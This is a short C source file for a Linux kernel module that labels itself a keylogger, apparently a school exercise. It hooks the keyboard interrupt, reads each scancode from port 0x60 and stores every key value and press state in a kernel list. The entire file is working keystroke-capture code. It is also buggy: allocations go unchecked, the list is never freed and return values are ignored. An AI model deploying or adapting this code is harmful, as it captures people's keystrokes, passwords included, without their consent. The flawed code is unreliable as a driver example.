#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <linux/list.h>
#include <linux/slab.h>

#include "stroke.h"

static LIST_HEAD(strokehead);

void *line_id = (void *)0x42;

static irq_handler_t toto(int irq, void *dev_id, struct pt_regs *regs)
{
	int scancode = inb(0x60);
	struct stroke_s *keystroke;

	keystroke = kmalloc(sizeof(struct stroke_s), GFP_ATOMIC);

	keystroke->state = scancode & 0x80;
	keystroke->value = scancode &= ~0x80;
	INIT_LIST_HEAD(&keystroke->list);
	list_add_tail(&keystroke->list, &strokehead);
	return (irq_handler_t)IRQ_HANDLED;
}

static int __init init_keyboard(void)
{
	int ret;

	pr_info("LOADED -- 42 keylogger module.\n");
	ret = request_irq(1, (irq_handler_t)toto, IRQF_SHARED, "my_keyboard_42", line_id);
	return 0;
}

static void __exit exit_keyboard(void)
{
	free_irq(1, line_id);
	pr_info("UNLOADED -- 42 keylogger module.\n");
}

module_init(init_keyboard);
module_exit(exit_keyboard);

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("agouby");
MODULE_DESCRIPTION("Keyboard driver, keylogger");
